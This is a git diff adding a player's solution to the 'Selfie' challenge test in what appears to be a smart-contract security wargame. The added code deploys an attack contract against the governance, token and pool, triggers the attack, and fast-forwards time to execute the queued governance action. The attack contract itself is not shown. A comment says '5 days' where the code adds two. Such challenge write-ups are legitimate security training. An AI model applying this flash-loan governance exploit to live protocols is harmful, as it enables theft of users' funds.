@@ -1,6 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { time } = require("@nomicfoundation/hardhat-network-helpers");
+const { BigNumber } = require('ethers');
 
 describe('[Challenge] Selfie', function () {
     let deployer, player;
@@ -39,6 +40,14 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const SelfieAttackFactory = await ethers.getContractFactory('SelfieAttack', player);
+        const SelfieAttack = await SelfieAttackFactory.deploy(governance.address, token.address, pool.address);
+        
+        await SelfieAttack.connect(player).attack();
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+
+        await governance.connect(player).executeAction(BigNumber.from(await governance.getActionCounter()).sub(1));
     });
 
     after(async function () {
